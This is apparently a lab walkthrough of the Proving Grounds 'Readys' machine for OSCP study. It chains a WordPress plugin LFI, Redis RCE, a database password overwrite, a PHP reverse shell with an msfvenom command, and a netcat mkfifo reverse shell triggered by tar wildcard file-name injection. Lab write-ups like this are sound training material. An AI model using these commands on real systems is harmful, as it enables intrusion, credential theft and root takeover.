---
title: Readys Walkthrough - Proving grounds
tags: Redis Wildcard WordPress
categories: Linux
---
In this entry I will solve PG's Readys machine. It is an Linux machine in the [TJNull](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview) list. My purpose in sharing this post is to prepare for OSCP exam. It is also to show you the way if you are in trouble. Please try to understand each step and take notes.

# Port and service enum

`nmap -sC -sV -p22,80,6379 192.168.223.166 -Pn -o targeted.txt`

![c5391e4051b28caa4a2edecf56afeb50.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/c5391e4051b28caa4a2edecf56afeb50.png?raw=true234)

By visiting http://192.168.223.166/ I find wordpress running so I run wpscan.

## Wordpress enumeration

`wpscan -e --url http://192.168.223.166/`

![6b16ef438cdc9c202a84aab24c57591c.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/6b16ef438cdc9c202a84aab24c57591c.png?raw=true)

The website discloses the admin user. I try to bruteforce the user runing wpscan

`wpscan -e --url http://192.168.223.166/wp-login.php -U admin -P /usr/share/wordlists/rockyou.txt`

## Redis enumeration

While the attack is running I check redis, I try to connect and get some info but authentication is required

`redis-cli -h 192.168.223.166`

![eae720747869812f3e7085d2ea0789d1.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/eae720747869812f3e7085d2ea0789d1.png?raw=true)

## Back to WP

Going back to the WordPress site, inspecting the source code I find SiteEditor plugin.

![6076885f10b4dcfbd3a4a4fa8223dc2f.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/6076885f10b4dcfbd3a4a4fa8223dc2f.png?raw=true)

I google for any exploit and I find a possible LFI https://www.exploit-db.com/exploits/44340

`[http://192.168.223.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax\_shortcode\_pattern.php?ajax_path=/etc/passwd](http://192.168.223.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax%5C_shortcode%5C_pattern.php?ajax_path=/etc/passwd)`

![768b40cdbb003c2ea7b4e4fdace55e0e.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/768b40cdbb003c2ea7b4e4fdace55e0e.png?raw=true)

## Back to redis

As redis is running, I try to read redis configuration file, under /etc/redis https://stackoverflow.com/questions/32284494/where-is-the-data-directory-in-redis.

[http://192.168.223.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax\_shortcode\_pattern.php?ajax_path=/etc/redis/redis.conf](http://192.168.223.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax%5C_shortcode%5C_pattern.php?ajax_path=/etc/redis/redis.conf)

I find a possible username for Redis service

![d744357582946f7c99ae541cf13d1163.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/d744357582946f7c99ae541cf13d1163.png?raw=true)

By typing `AUTH Ready4Redis?` I  get the Redis version: 5.0.14.

![532c82325e1499468947b4b2d704e4bd.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/532c82325e1499468947b4b2d704e4bd.png?raw=true)

# Getting a shell

After googling for the version  I came out that this version is vulnerable to RCE . In this case I use the following [exploit](https://github.com/n0b0dyCN/redis-rogue-server). If fails try again :)

![7c570a5c9b43f3201629238e63a2bbf6.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/7c570a5c9b43f3201629238e63a2bbf6.png?raw=true)

I get a TTY through `python3 -c "import pty; pty.spawn('/bin/bash')".` After that I search for the mysql database credentials in `/var/www/html/wp-config.php`

![63258e92a72d7fe42dd95cb11f310676.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/63258e92a72d7fe42dd95cb11f310676.png?raw=true)

# MySQL

I connect to mysql and then I dump admin's credentials:

`mysql -u karl -p` Then paste the password found on wp-config.php

`show databases;`

`use wordpress;`

`select * from wp_users;`

![569b714daa20fc604f40c8e724b95821.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/569b714daa20fc604f40c8e724b95821.png?raw=true)
I try to crack the hash but I do not get any result, so I update admin's password in mysql databse, for that I use [wodpress hash generator](https://www.useotools.com/wordpress-password-hash-generator/.) tool

![bf64b842a1784c3b54a9d96863a1e8a9.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/bf64b842a1784c3b54a9d96863a1e8a9.png?raw=true)

By typing the desired password, the tool creates the mysql command to update the user's password. **Remember to rename your_user_name by 'admin' and add ";" **

``UPDATE `wp_users` SET `user_pass` = '``$P$`BxLKwoTitAjOYxf8iHcDrx0Z3ksN8v/' WHERE user_login = 'admin';`

![8228a5ec0cb9527c65914d3086843920.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/8228a5ec0cb9527c65914d3086843920.png?raw=true)

# WordPress Exploitation

After that I log in to the WordPress admin portal, with admin:admin

Go to Appearance -->Theme editor. (I am using twentytwenty template)

![4748cfa6680b70d337cf2ec9c3839b69.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/4748cfa6680b70d337cf2ec9c3839b69.png?raw=true)

Edit 404.php file and copy [pentestmonkey's reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) or generate one with msfvenom:

msfvenom -p php/reverse_php LHOST=192.168.45.159 LPORT=88 -f raw > reverse.php

Then trigger the exploit by visiting [http://192.168.223.166/wp-content/themes/twentytwenty/404](http://192.168.223.166/wp-content/themes/twentytwenty/404.php)

# Privilege Escalation

After getting the shell I check crontab and a backup.sh file is running.

![6d43ef534744f360c62594fb2eb4963b.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/6d43ef534744f360c62594fb2eb4963b.png?raw=true)

Reading the backup file is seems that the script uses "tar" command

![f38f9eb8b8230c5bc6e76be24955b121.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/f38f9eb8b8230c5bc6e76be24955b121.png?raw=true)

### Wildcard for Privilege Escalation

The tar command in that script is using a wildcard to backup all files

First, I will create a reverse shell called "shell.sh" using netcat

`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc 10.10.10.10 4445 >/tmp/f" > shell.sh`

The following commands will create two empty files with the names: “–checkpoint-action=exec=sh shell.sh” and “–checkpoint=1”. These file names will be interpreted by Tar as switches when Tar attempts to bundle them. Once –checkpoint=1 is invoked tar will look for any possible actions to take. In this case that action will be to execute “sh shell.sh”.

`echo "" > "--checkpoint-action=exec=sh shell.sh"`

`echo "" > --checkpoint=1`

Finally, a netcat listener is created on the Kali machine on port 4445. Since the cronjob on the victim machine runs every two minutes the netcat listener will receive a connection within that amount of time and then spawn a shell as the root user.

Wait to the crontab and get the shell as root

![ef8bce19d64b5cc79ead44d0d007ed59.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/ef8bce19d64b5cc79ead44d0d007ed59.png?raw=true)

Pwn3d! :D
